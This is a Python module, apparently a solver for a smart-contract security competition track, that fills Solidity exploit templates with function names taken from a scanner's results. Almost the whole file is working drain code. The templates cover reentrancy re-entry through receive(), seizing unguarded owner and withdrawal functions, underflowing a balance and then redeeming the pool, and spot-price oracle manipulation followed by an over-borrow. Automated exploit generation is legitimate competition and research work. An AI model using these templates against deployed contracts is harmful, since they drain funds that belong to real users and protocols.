# TRUST404 Track04 — strategy selection + Exploit.sol templates.
# 각 취약 유형에 대해, scanner 가 뽑은 함수 시그니처를 채워 Exploit.sol 을
# 결정론적으로 생성한다. 함수 이름을 하드코딩하지 않고 스캔 결과에서 가져오되,
# 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.
import random

from scanner import FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE

STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE]

HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"


def seeded_order(order, scores, seed):
    """Deterministic ordering: score desc, ties broken by a seeded PRNG so the
    same --seed always yields the same sequence."""
    rng = random.Random(seed)
    buckets = {}
    for fam in order:
        buckets.setdefault(scores.get(fam, 0), []).append(fam)
    result = []
    for score in sorted(buckets.keys(), reverse=True):
        group = buckets[score][:]
        rng.shuffle(group)
        result.extend(group)
    return result


def _fn_name(findings, key, default):
    fn = findings.get(key)
    return fn["name"] if fn else default


def build_exploit(fam, findings):
    scores = findings["scores"]
    if scores.get(fam, 0) <= 0:
        return None
    if fam == FAM_REENTRANCY:
        return _reentrancy(findings)
    if fam == FAM_ACCESS:
        return _access(findings)
    if fam == FAM_INTEGER:
        return _integer(findings)
    if fam == FAM_ORACLE:
        return _oracle(findings)
    return None


def _reentrancy(findings):
    deposit = _fn_name(findings, "reentrancy_deposit", "deposit")
    wfn = findings.get("reentrancy_withdraw")
    withdraw = wfn["name"] if wfn else "withdraw"
    # withdraw may take a uint amount or no args
    wargs = wfn["args"] if wfn else []
    takes_amount = any(t.startswith("uint") for t, _ in wargs)
    if takes_amount:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}(uint256 amount) external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}(unit);"
        re_call = f"target.{withdraw}(unit);"
    else:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}() external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}();"
        re_call = f"target.{withdraw}();"
    body = (
        "// Strategy: reentrancy (CEI violation) — re-enter withdraw before the\n"
        "// balance is zeroed, draining the seed float below the solvency floor.\n"
        + iface +
        "contract Exploit {\n"
        "    ITarget public target;\n"
        "    uint256 public unit;\n\n"
        "    function run(address _t) external payable {\n"
        "        target = ITarget(_t);\n"
        "        unit = 1 ether;\n"
        f"        target.{deposit}{{value: unit}}();\n"
        f"        {run_call}\n"
        "    }\n\n"
        "    receive() external payable {\n"
        f"        if (address(target).balance >= unit) {{ {re_call} }}\n"
        "    }\n"
        "}\n"
    )
    return HEADER + body


def _access(findings):
    drain = findings.get("access_drain")
    setowner = findings.get("access_setowner")
    lines = []
    ifaces = []
    if setowner:
        ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
    if drain:
        # signature: figure out arg order (address to, uint amount) heuristically
        args = drain["args"]
        addr_first = args and args[0][0] == "address"
        if addr_first and len(args) >= 2:
            ifaces.append(f"    function {drain['name']}(address to, uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(this), address(_t).balance);")
        elif len(args) >= 1 and args[0][0].startswith("uint"):
            ifaces.append(f"    function {drain['name']}(uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(_t).balance);")
        else:
            ifaces.append(f"    function {drain['name']}() external;")
            lines.append(f"        t.{drain['name']}();")
    if setowner:
        lines.insert(0, f"        t.{setowner['name']}(address(this));")
    if not lines:
        return None
    body = (
        "// Strategy: broken access control — call the unguarded privileged\n"
        "// function(s) directly to seize ownership and/or drain the vault.\n"
        "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        + "\n".join(lines) + "\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _integer(findings):
    transfer = _fn_name(findings, "integer_transfer", "transfer")
    redeem = _fn_name(findings, "integer_redeem", "redeem")
    body = (
        "// Strategy: integer underflow (unchecked) — underflow the caller's\n"
        "// balance to ~2**256 via transfer, then redeem the entire ETH float.\n"
        "interface ITarget {\n"
        f"    function {transfer}(address to, uint256 amount) external;\n"
        f"    function {redeem}(uint256 amount) external;\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        f"        t.{transfer}(address(0xdEaD), 1);\n"
        f"        t.{redeem}(address(_t).balance);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _oracle(findings):
    faucet = _fn_name(findings, "oracle_faucet", "faucet")
    swap = _fn_name(findings, "oracle_swap", "swapBorForCol")
    deposit = _fn_name(findings, "oracle_deposit", "depositCollateral")
    borrow = _fn_name(findings, "oracle_borrow", "borrow")
    body = (
        "// Strategy: spot-price oracle manipulation — mint free BOR from the\n"
        "// faucet, swap it to drain COL reserves and spike the spot price, then\n"
        "// deposit the received COL and borrow against the inflated valuation.\n"
        "interface IERC20 {\n"
        "    function approve(address s, uint256 a) external returns (bool);\n"
        "    function balanceOf(address w) external view returns (uint256);\n"
        "}\n"
        "interface IPool {\n"
        f"    function {swap}(uint256 borIn) external;\n"
        "    function spotPrice() external view returns (uint256);\n"
        "}\n"
        "interface ITarget {\n"
        "    function collateralToken() external view returns (address);\n"
        "    function borrowToken() external view returns (address);\n"
        "    function pool() external view returns (address);\n"
        f"    function {faucet}() external;\n"
        f"    function {deposit}(uint256 amount) external;\n"
        f"    function {borrow}(uint256 amount) external;\n"
        "    function collateralOf(address w) external view returns (uint256);\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget o = ITarget(_t);\n"
        "        IERC20 col = IERC20(o.collateralToken());\n"
        "        IERC20 bor = IERC20(o.borrowToken());\n"
        "        address pool = o.pool();\n"
        f"        for (uint256 i = 0; i < 5; i++) {{ o.{faucet}(); }}\n"
        "        uint256 borBal = bor.balanceOf(address(this));\n"
        "        bor.approve(pool, type(uint256).max);\n"
        f"        IPool(pool).{swap}(borBal);\n"
        "        uint256 colBal = col.balanceOf(address(this));\n"
        "        col.approve(_t, type(uint256).max);\n"
        f"        o.{deposit}(colBal);\n"
        "        uint256 price = IPool(pool).spotPrice();\n"
        "        uint256 value = (o.collateralOf(address(this)) * price) / 1e18;\n"
        f"        o.{borrow}(value);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body
